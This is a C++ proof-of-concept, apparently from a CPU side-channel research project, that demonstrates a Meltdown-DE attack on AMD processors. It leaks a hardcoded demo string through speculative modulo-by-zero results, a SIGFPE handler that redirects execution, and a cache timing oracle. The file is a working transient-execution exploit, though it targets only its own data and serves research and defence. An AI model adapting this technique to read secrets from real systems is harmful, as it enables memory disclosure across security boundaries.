/*
 * Copyright 2019 Google LLC
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *   https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

/**
 * Demonstrates the Meltdown-DE on AMD.
 * We exploit the fact that the data from the remainder on AMD is speculatively
 * computed this way (before the #DE exception is raised and the remainder is
 * zeroed):
 * 0 % 0 = 0
 * 1 % 0 = 2
 * 2 % 0 = 2
 * 3 % 0 = 3
 * 4 % 0 = 2
 * 5 % 0 = 2
 * 6 % 0 = 3
 * 7 % 0 = 3
 * 8 % 0 = 2
 * 9 % 0 = 2
 * 10 % 0 = 2
 * 11 % 0 = 2
 * 12 % 0 = 3
 * 13 % 0 = 3
 * 14 % 0 = 3
 * 15 % 0 = 3
 * 16 % 0 = 2
 * 7 times more 2
 * 8 times 3
 * 16 times 2
 * 16 times 3
 * 32 times 2
 * 32 times 3
 * etc.
 * We use the second row, because it's the weirdest one, as the speculative
 * remainder is bigger than both operands.
 * Therefore we accomodate the private data to be stored in multiple strings
 * where the secret data is on index 2 (first two indices contain dummy data).
 * Then we speculatively access those unreachable characters in a loop.
 **/

#include "compiler_specifics.h"

#ifndef __linux__
#  error Unsupported OS. Linux required.
#endif

#if !SAFESIDE_IA32 && !SAFESIDE_X64
#  error Unsupported architecture. AMD required.
#endif

#include <array>
#include <cstring>
#include <fstream>
#include <iostream>

#include <signal.h>

#include "cache_sidechannel.h"
#include "instr.h"
#include "utils.h"

const char *public_data = "Hello, world!";

// First two characters of each string are always dummy.
const char *private_data[] = {
  "XXI",
  "XXt",
  "XX'",
  "XXs",
  "XX ",
  "XXa",
  "XX ",
  "XXs",
  "XXe",
  "XXc",
  "XXr",
  "XXe",
  "XXt",
  "XX!",
  "XX!",
  "XX!",
};

constexpr size_t kPrivateDataLength = 16;

// We must store zero and one as a global variables to avoid optimizing them
// out.
size_t zero = 0;
size_t one = 1;

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &isolated_oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    size_t safe_offset = run % strlen(public_data);
    sidechannel.FlushOracle();

    ForceRead(isolated_oracle.data() + static_cast<size_t>(
        public_data[safe_offset]));

    // This fails with division exception. Whatever is the result of 1 % 0, it
    // cannot be more than 1 and first two characters are dummy in each private
    // string. During the modulo by zero, SIGFPE is raised and the signal
    // handler moves the instruction pointer to the afterspeculation label.
    ForceRead(isolated_oracle.data() + static_cast<size_t>(
        private_data[offset][one % zero]));

    std::cout << "Dead code. Must not be printed." << std::endl;

    // The exit call must not be unconditional, otherwise clang would optimize
    // out everything that follows it and the linking would fail.
    if (strlen(public_data) != 0) {
      exit(EXIT_FAILURE);
    }

    // SIGFPE signal handler moves the instruction pointer to this label.
    asm volatile("afterspeculation:");

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);

    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

static void Sigfpe(
    int /* signum */, siginfo_t * /* siginfo */, void *context) {
  // SIGFPE signal handler.
  // Moves the instruction pointer to the "afterspeculation" label.
  ucontext_t *ucontext = static_cast<ucontext_t *>(context);
#if SAFESIDE_X64
  ucontext->uc_mcontext.gregs[REG_RIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#elif SAFESIDE_IA32
  ucontext->uc_mcontext.gregs[REG_EIP] =
      reinterpret_cast<greg_t>(afterspeculation);
#else
#  error Unsupported architecture.
#endif
}

static void SetSignal() {
  struct sigaction act;
  act.sa_sigaction = Sigfpe;
  act.sa_flags = SA_SIGINFO;
  sigaction(SIGFPE, &act, NULL);
}

int main() {
  SetSignal();
  std::cout << "Leaking the string: ";
  std::cout.flush();
  for (size_t i = 0; i < kPrivateDataLength; ++i) {
    std::cout << LeakByte(i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
